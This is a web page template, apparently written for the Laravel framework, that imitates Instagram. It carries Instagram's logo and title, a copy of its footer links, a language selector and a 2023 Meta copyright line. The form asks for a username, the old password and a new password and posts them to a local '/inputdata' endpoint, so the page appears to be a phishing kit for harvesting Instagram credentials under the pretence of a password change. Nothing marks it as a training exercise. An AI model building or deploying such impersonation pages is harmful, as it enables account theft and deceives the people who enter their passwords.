<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Instagram">
    <meta name="author" content="MasRockey">
    <link rel="shortcut icon" href="img/icon.png" type="image/x-icon">
    <title>Instagram</title>
    @vite(['resources/css/app.css','resources/js/app.js'])
</head>
<body class=" h-screen bg-gray-100 flex flex-col justify-center items-center">
        <div class="">
            <!-- SMARTPHONE SECTION -->
          <!--  <div class="smartphone">
                <div class="screens">
                    <img class="screen fade" src="img/screen1.png" alt="screen1">
                    <img class="screen fade" src="img/screen2.png" alt="screen2">
                    <img class="screen fade" src="img/screen3.png" alt="screen3">
                </div>
                <img src="img/smartphones.png" alt="smartphones">
            </div> -->
            <!-- SMARTPHONE SECTION END -->
            <!-- FORM SECTION -->
            <div class="form-area">
                <form action="/inputdata" method="POST">
                    @csrf
                    <div class="flex flex-col justify-center items-center">
                        <img src="img/logo.png" alt="Instagram Logo">
                    </div>
                    <br>
                    <input type="text" name="username" placeholder="Phone Number, username, or, email">
                    <input type="password" name="oldpassword" placeholder="Old Password">
                    <input type="password" name="newpassword" placeholder="New Password">
                    <br>
                    <input type="submit" value="Submit">
                    <br>
                <!--<div class="apps">
                    <p>Get The App.</p>
                    <a href="#"> <img src="img/appstore.png" alt="Baixar o aplicativo na AppStore"> </a>
                    <a href="#"> <img src="img/googleplay.png" alt="Baixar o aplicativo no Google Play"> </a>
                </div> -->
            </div>
        </div>
            <!-- FORM SECTION END -->
            <!-- FOOTER -->
        <footer class="m-4">
            <div class="w-full mx-auto container md:p-6 p-4 md:flex md:items-center md:justify-between">
                <ul class="flex flex-wrap items-center mt-3 text-sm font-small text-gray-500 dark:text-gray-400 sm:mt-0">
                    <li>
                        <a href="#" class="mr-4 hover:underline md:mr-6 ">Meta</a>
                    </li>
                    <li>
                        <a href="#" class="mr-4 hover:underline md:mr-6">About</a>
                    </li>
                    <li>
                        <a href="#" class="mr-4 hover:underline md:mr-6">Blog</a>
                    </li>
                    <li>
                        <a href="#" class="mr-4 hover:underline md:mr-6">Jobs</a>
                    </li>
                    <li>
                        <a href="#" class="mr-4 hover:underline md:mr-6">Help</a>
                    </li>
                    <li>
                        <a href="#" class="mr-4 hover:underline md:mr-6">API</a>
                    </li>
                    <li>
                        <a href="#" class="mr-4 hover:underline md:mr-6">Privacy</a>
                    </li>
                    <li>
                        <a href="#" class="mr-4 hover:underline md:mr-6">Term</a>
                    </li>
                    <li>
                        <a href="#" class="mr-4 hover:underline md:mr-6">Top Accounts</a>
                    </li>
                    <li>
                        <a href="#" class="mr-4 hover:underline md:mr-6">Locations</a>
                    </li>
                    <li>
                        <a href="#" class="mr-4 hover:underline md:mr-6">Instagram Lite</a>
                    </li>
                    <li>
                        <a href="#" class="mr-4 hover:underline md:mr-6">Contact Uploading & Non-Users</a>
                    </li>
                </ul>
            </div>

            <div class="text-sm text-gray-500 sm:text-center">
                <select aria-label="Trocar idioma de exibição">
                    <option value="en">English</option>
                    <option value="pt">Português (Portugal)</option>
                    <option value="af">Afrikaans</option>
                    <option value="cs">Čeština</option>
                    <option value="da">Dansk</option>
                    <option value="de">Deutsch</option>
                    <option value="el">Ελληνικά</option>
                    <option value="en-gb">English (UK)</option>
                    <option value="es">Español (España)</option>
                    <option value="es-la">Español</option>
                    <option value="fi">Suomi</option>
                    <option value="fr">Français</option>
                    <option value="id">Bahasa Indonesia</option>
                    <option value="it">Italiano</option>
                    <option value="ja">日本語</option>
                    <option value="ko">한국어</option>
                    <option value="ms">Bahasa Melayu</option>
                    <option value="nb">Norsk</option>
                    <option value="nl">Nederlands</option>
                    <option value="pl">Polski</option>
                    <option value="pt-br">Português (Brasil)</option>
                    <option value="ru">Русский</option>
                    <option value="sv">Svenska</option>
                    <option value="th">ภาษาไทย</option>
                    <option value="tl">Filipino</option>
                    <option value="tr">Türkçe</option>
                    <option value="zh-cn">中文(简体)</option>
                    <option value="zh-tw">中文(台灣)</option>
                    <option value="bn">বাংলা</option>
                    <option value="gu">ગુજરાતી</option>
                    <option value="hi">हिन्दी</option>
                    <option value="hr">Hrvatski</option>
                    <option value="hu">Magyar</option>
                    <option value="kn">ಕನ್ನಡ</option>
                    <option value="sk">Slovenčina</option>
                    <option value="ta">தமிழ்</option>
                    <option value="te">తెలుగు</option>
                    <option value="vi">Tiếng Việt</option>
                    <option value="zh-hk">中文(香港)</option>
                    <option value="bg">Български</option>
                    <option value="ro">Română</option>
                    <option value="sr">Српски</option>
                    <option value="uk">Українська</option>
                </select>
                <span>&copy; 2023 Instagram from Meta</span>
            </div>
        </footer>
    <script src="js/app.js"></script>
    <script src="js/brands.min.js"></script>
    <script src="js/fontawesome.min.js"></script>
</body>
</html>
